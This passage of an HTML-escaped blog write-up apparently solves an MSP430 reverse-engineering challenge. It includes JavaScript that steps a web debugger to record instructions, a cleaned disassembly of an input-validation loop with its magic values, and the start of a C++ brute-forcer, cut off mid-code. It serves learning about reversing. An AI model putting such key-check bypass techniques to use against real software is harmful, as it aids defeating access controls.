            &lt;span class=&quot;nx&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;unbreak &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;padStart&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'0'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
            &lt;span class=&quot;kr&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

            &lt;span class=&quot;nx&quot;&gt;target&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;parseInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;0x&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;reg12&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;textContent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;nx&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;break &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;padStart&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'0'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
            &lt;span class=&quot;kr&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

            &lt;span class=&quot;nx&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;kr&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

            &lt;span class=&quot;nx&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;unbreak &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;padStart&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'0'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
            &lt;span class=&quot;kr&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

            &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;reg0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;textContent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'e'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
                &lt;span class=&quot;nx&quot;&gt;dic&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;insnbytes&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;textContent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;nx&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;kr&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

            &lt;span class=&quot;nx&quot;&gt;target&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;parseInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;0x&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;reg0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;textContent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x38&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;nx&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;break &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;padStart&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'0'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
            &lt;span class=&quot;kr&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

            &lt;span class=&quot;nx&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;kr&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

            &lt;span class=&quot;nx&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;unbreak &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;padStart&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'0'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
            &lt;span class=&quot;kr&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;nx&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;kr&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;runCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;dic&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dic&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;This program runs for around 10 minutes for a input with 2 bytes, and around 30 for one with 6 bytes. The results can then be copied into a text file, where the &lt;code class=&quot;highlighter-rouge&quot;&gt;mov&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;br&lt;/code&gt; instructions can be removed using &lt;code class=&quot;highlighter-rouge&quot;&gt;egrep&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;egrep -v &quot;^(3c40|004d)&quot; uncleaned.txt | tee cleaned.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Disassembling the remaining instructions provides the following code:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;3540 0026      mov	#0x2600, r5
0643           clr	r6

//loop start
2455           add	@r5, r4
8410           swpb	r4
36e5           xor	@r5+, r6
06e4           xor	r4, r6
04e6           xor	r6, r4
06e4           xor	r4, r6
8593 0000      tst	0x0(r5)
0742           mov	sr, r7
27f3           and	#0x2, r7
0711           rra	r7
17e3           xor	#0x1, r7
8710           swpb	r7
0711           rra	r7
8711           sxt	r7
8710           swpb	r7
8711           sxt	r7
3840 184b      mov	#0x4b18, r8
08f7           and	r7, r8
37e3           xor	#-0x1, r7
37f0 aa47      and	#0x47aa, r7
0857           add	r7, r8
0743           clr	r7
0c48           mov	r8, r12
004d           br	12
//loop end

3490 b1fe      cmp	#0xfeb1, r4
0742           mov	sr, r7
0443           clr	r4
3690 9892      cmp	#0x9298, r6
07f2           and	sr, r7
0643           clr	r6
0711           rra	r7
17e3           xor	#0x1, r7
8710           swpb	r7
0711           rra	r7
0711           rra	r7
0711           rra	r7
0711           rra	r7
02d7           bis	r7, sr
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It appears 2 values are computed from the input and are stored in r4 and r6. The registers are then compared with 2 magic values, which act as validation for the input. If it doesn’t pass, a value with the &lt;code class=&quot;highlighter-rouge&quot;&gt;CPU_OFF&lt;/code&gt; flag set to 1 is inserted into sr, which causes termination of the program. The ending condition of the loop is checked by &lt;code class=&quot;highlighter-rouge&quot;&gt;tst 0x0(r5)&lt;/code&gt;, and everything in the loop after that command appears to be a convoluted way to continue the loop. The loop body can thus be cleaned, and transformed into:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;2455           add	@r5, r4
8410           swpb	r4
36e5           xor	@r5+, r6
06e4           xor	r4, r6
04e6           xor	r6, r4
06e4           xor	r4, r6
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now we will look at the end of the program closely. The &lt;code class=&quot;highlighter-rouge&quot;&gt;CPU_OFF&lt;/code&gt; flag is on the 5th bit from the right, and it cannot be set at the end of the program or the CPU will be turned off, requiring &lt;code class=&quot;highlighter-rouge&quot;&gt;reset&lt;/code&gt; to reboot it. The flag is not set when r4 is exactly 0xfeb1 and r6 is exactly 0x9298. This can be derived by tracing the change of the location of the bit in r7 as it is maniputed by the various instructions such as &lt;code class=&quot;highlighter-rouge&quot;&gt;rra&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;swpb&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&quot;the-solution&quot;&gt;The solution&lt;/h2&gt;

&lt;p&gt;With knowledge of exactly how the input is validated, we can write a program that brute forces all possible values or a set of equations that solves for the input. The latter is difficult and takes effort. We have no time constraints, so brute force is what we will use. Initially, I was lazy and tried to utilise &lt;code class=&quot;highlighter-rouge&quot;&gt;itertools.product&lt;/code&gt; in python so I dont need to generate the number myself. However, I underestimated the time required for the brute force, as the python solution took too long. Eventually, I wrote the following the C++ program, which calculates all 6 byte solution (it implicitly includes all 5, 4, 3, 2, 1 byte solutions, where the end is padded by 0x0).&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cpp&quot; data-lang=&quot;cpp&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;bits/stdc++.h&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;using&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;namespace&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;R4_MAGIC&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xfeb1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;R6_MAGIC&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x9298&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;genNext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vector&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cur&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;carry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cur&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;carry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cur&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cur&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;carry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cur&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;carry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;carry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;vector&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cur&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;genNext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cur&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
